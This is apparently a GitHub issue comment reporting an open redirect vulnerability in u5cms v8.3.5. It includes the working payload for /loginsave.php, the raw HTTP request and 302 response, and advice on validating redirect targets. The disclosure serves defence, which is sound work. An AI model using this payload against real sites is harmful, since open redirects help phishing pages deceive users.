### **[1ue0v](/1ue0v)** commented [Jun 4, 2022](#issue-1260599769)

| URL redirection vulnerability in u5cms v8.3.5  This script is possibly vulnerable to URL redirection attacks.  URL redirection is sometimes used as a part of phishing attacks that confuse visitors about which web site they are visiting. By modifying the parameters, the attacker can make the user jump to the phishing web page to realize the attack.  URL redirection vulnerability exists in /loginsave.php. When the user accesses the address constructed by the attacker, the web page will be redirected to the address pointed to by the parameter "u", instead of u5cms' own web page.  The payload is `/loginsave.php?u=http://xfs.bxss.me/`  When users access this URL, the browser will be redirected to `https://www.acunetix.com/vulnerability-scanner/acumonitor-technology`  Here are the HTTP request and HTTP response.  HTTP request:  ``` GET /loginsave.php?u=http://xfs.bxss.me/ HTTP/1.1 Host: 192.168.116.133 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1  ```  HTTP response:  ``` HTTP/1.1 302 Moved Temporarily Date: Sat, 04 Jun 2022 03:09:40 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 X-Powered-By: PHP/5.3.29 X-XSS-Protection: 0 Set-Cookie: u=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/; httponly Set-Cookie: p=56e2526ba3e8ff31822f36a269d6434027ba5dcd; path=/; httponly Location: [http://xfs.bxss.me?1654312181](http://xfs.bxss.me/?1654312181) Content-Length: 0 Connection: close Content-Type: text/html; charset=latin1  ```  Eventually, the browser will be redirected to `https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/`  [image](https://user-images.githubusercontent.com/54606628/171977935-13e57e8d-ed05-4302-9596-7e2aae8f0fcf.png)  If possible, I suggest you check whether the end of the domain name is the current domain name during the development process. If yes, the browser will jump. Otherwise, you should filter out illegal parameters.  Best wishes! |
